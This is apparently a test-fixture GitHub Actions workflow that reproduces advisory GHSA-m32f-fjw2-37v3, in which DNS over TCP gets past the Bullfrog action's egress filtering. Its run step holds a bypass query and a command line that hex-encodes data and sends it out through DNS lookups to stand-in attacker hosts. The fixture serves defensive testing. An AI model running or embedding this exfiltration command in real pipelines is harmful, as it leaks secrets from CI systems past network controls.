@@ -1,0 +1,35 @@
+# GHSA-m32f-fjw2-37v3: DNS over TCP bypasses domain filtering
+# Advisory: https://github.com/advisories/GHSA-m32f-fjw2-37v3
+# Affected Action: bullfrogsec/bullfrog
+# Vulnerability Type: Network Policy Bypass (Runtime)
+# Expected Detection Rule: Not detectable by static analysis (runtime behavior)
+
+name: GHSA-m32f-fjw2-37v3 Vulnerable Pattern
+on:
+  pull_request:
+
+jobs:
+  vulnerable:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Setup Bullfrog with egress filtering
+        uses: bullfrogsec/bullfrog@v1
+        with:
+          egress-policy: block
+          allowed-endpoints: |
+            api.github.com:443
+            github.com:443
+
+      - name: Checkout code
+        uses: actions/checkout@v4
+
+      # Vulnerability: DNS over TCP (port 53) bypasses domain filtering
+      # The action only filters UDP DNS queries, allowing TCP DNS to resolve
+      # blocked domains and potentially exfiltrate data
+      - name: Query DNS over TCP
+        run: |
+          # This bypasses the egress-policy: block
+          dig +tcp @8.8.8.8 malicious-domain.com
+
+          # Could be used for data exfiltration
+          echo "sensitive-data" | xxd -p | xargs -I {} dig +tcp @attacker-dns.com {}.exfil.attacker.com
